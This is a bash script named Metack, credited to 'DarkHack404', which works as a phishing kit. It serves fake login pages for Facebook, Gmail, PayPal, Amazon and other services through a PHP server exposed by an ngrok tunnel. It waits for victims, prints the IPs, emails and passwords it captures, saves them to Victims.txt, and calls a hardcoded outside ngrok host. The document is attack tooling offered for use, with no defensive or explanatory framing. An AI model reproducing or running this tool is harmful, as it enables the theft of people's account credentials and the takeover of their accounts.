#!/bin/bash
# Metack v1.0
# Powered by DarkHack404


trap 'printf "\n";stop' 2

R='\e[1;91m'   # لون أحمر
G='\e[1;92m'   # لون أخضر
Y='\e[1;93m'   # لون أصفر
B='\e[1;94m'   # لون أزرق
M='\e[1;95m'   # لون أرجواني
C='\e[1;96m'   # لون سماوي
W='\e[1;97m'   # لون أبيض
N='\033[0m'       # No color
${C} DarkHack404 ${N}${R}
banner() {
clear

printf " ${M} __  __ _____ _____  _    ____ _  __ ${N} \e[0m\n " 
printf " ${M}|  \/  | ____|_   _|/ \  / ___| |/ / ${N} \e[0m\n " 
printf " ${M}| |\/| |  _|   | | / _ \| |   | ' /  ${N} \e[0m\n " 
printf " ${M}| |  | | |___  | |/ ___ \ |___| . \   ${N} \e[0m\n " 
printf " ${M}|_|  |_|_____| |_/_/   \_\____|_|\_\ ${N} \e[0m\n " 

printf " ${R}  _________________________ ${N} \e[0m\n " 
printf " ${R} | ▄︻デ═══-一҉                                            .${N} \e[0m\n " 
printf " ${R} | Metack                  |${N} \e[0m\n " 
printf " ${R} | Powered By:DarkHack404  |${N} \e[0m\n " 
printf " ${R} |                         |${N} \e[0m\n " 
printf " ${R} |_________________________|${N} \e[0m\n "  
printf " ${R}                                                             ${N} \e[0m\n " 

                                                   








}

dependencies() {


command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
 


}
stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}


catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip

cat ip.txt >> saved.ip.txt


}

catch_info() {

mail=$(grep -a 'Mail:' info.txt | cut -d ":" -f2 | tr -d '\r')
pass=$(grep -a 'Pass:' info.txt | cut -d ":" -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IFO\e[0m\e[1;77m ${B} Mail: ${R}$mail ${B}Password: ${R}$pass ${N} \e[0m\n"


phpurl="https://living-deadly-goat.ngrok-free.app/login.php"
your_url=${url}
curl "$phpurl?phpurl=$your_url"





cat info.txt >> Victims.txt


}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Victim opened the link!\n"
catch_ip
rm -rf ip.txt

fi

sleep 0.1

if [[ -e "info.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Victim Killed \e[0m\n"
catch_info
rm -rf info.txt
fi
sleep 0.5

done 

}






payload_ngrok() {

link="https://living-deadly-goat.ngrok-free.app"
sed 's+forwarding_link+'$link'+g' template.php > index.php

if [[ $option_tem -eq 1 ]]; then

sed 's+forwarding_link+'$link'+g' Facebook.html > index3.html

sed 's+Facebook Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' Instagram.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 3 ]]; then
sed 's+forwarding_link+'$link'+g' Gmail.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 4 ]]; then
sed 's+forwarding_link+'$link'+g' Twitter.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 5 ]]; then
sed 's+forwarding_link+'$link'+g' Linkedin.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 6 ]]; then
sed 's+forwarding_link+'$link'+g' WordPress.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 7 ]]; then
sed 's+forwarding_link+'$link'+g' NetFlix.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 8 ]]; then
sed 's+forwarding_link+'$link'+g' Steam.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 9 ]]; then
sed 's+forwarding_link+'$link'+g' Spotify.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 10 ]]; then
sed 's+forwarding_link+'$link'+g' SnapShat.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 11 ]]; then
sed 's+forwarding_link+'$link'+g' Amazon.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

elif [[ $option_tem -eq 12 ]]; then
sed 's+forwarding_link+'$link'+g' Paypal.html > index3.html
sed 's+Instagram Url+'$url'+g' index3.html > index2.html

else
sed 's+forwarding_link+'$link'+g' Gmail.html > index3.html
fi
rm -rf index3.html

}
select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
Metack
else
printf "\n-----Choose a template----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Facebook\e[0m\n"  
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Instagram\e[0m\n"        
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Gmail \e[0m\n"   
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Twitter\e[0m\n"         
printf "\e[1;92m[\e[0m\e[1;77m05\e[0m\e[1;92m]\e[0m\e[1;93m Lenkidin\e[0m\n"   
printf "\e[1;92m[\e[0m\e[1;77m06\e[0m\e[1;92m]\e[0m\e[1;93m WordPress\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[0m\e[1;92m]\e[0m\e[1;93m NetFlix\e[0m\n" 
printf "\e[1;92m[\e[0m\e[1;77m08\e[0m\e[1;92m]\e[0m\e[1;93m Steam \e[0m\n"            
printf "\e[1;92m[\e[0m\e[1;77m09\e[0m\e[1;92m]\e[0m\e[1;93m Spotify \e[0m\n" 
printf "\e[1;92m[\e[0m\e[1;77m10\e[0m\e[1;92m]\e[0m\e[1;93m SnapShat\e[0m\n"                
printf "\e[1;92m[\e[0m\e[1;77m11\e[0m\e[1;92m]\e[0m\e[1;93m Amazon\e[0m\n"                     
printf "\e[1;92m[\e[0m\e[1;77m12\e[0m\e[1;92m]\e[0m\e[1;93m PayPal\e[0m\n"





















default_option_template="1"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then

printf 'facebook'
elif [[ $option_tem -eq 2 ]]; then
printf 'insta'
elif [[ $option_tem -eq 3 ]]; then
printf 'Gmail'
elif [[ $option_tem -eq 4 ]]; then
printf 'Twitter'
elif [[ $option_tem -eq 5 ]]; then
printf 'Lenkidin'
elif [[ $option_tem -eq 6 ]]; then
printf 'wordpress'
elif [[ $option_tem -eq 7 ]]; then
printf 'netfilx'
elif [[ $option_tem -eq 8 ]]; then
printf 'steam'
elif [[ $option_tem -eq 9 ]]; then
printf 'Spotify'
elif [[ $option_tem -eq 10 ]]; then
printf 'Snapshat'
elif [[ $option_tem -eq 11 ]]; then
printf 'Amazon'
elif [[ $option_tem -eq 12 ]]; then
printf 'PayPal'

else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi






}

ngrok_server() {

if [[ -e /root/.config/ngrok/ngrok.yml ]]; then
printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok ****************"
#cat   /root/.config/ngrok/ngrok.yml
read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token

if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then

read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth

./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
fi
else
read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
fi
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:80 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
./ngrok start --all > /dev/null 2>&1 &
sleep 10

link="https://fitting-radically-gopher.ngrok-free.app"
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi


payload_ngrok
checkfound




}




Metack() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n-----Tunnel server----\n"    
printf "\n\e[1;92m[\e[0m\e[1;77mUse\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"

default_option_server="1"

option_server="${option_server:-${default_option_server}}"
select_template
ngrok_server



printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
Metack


}


banner
dependencies
Metack
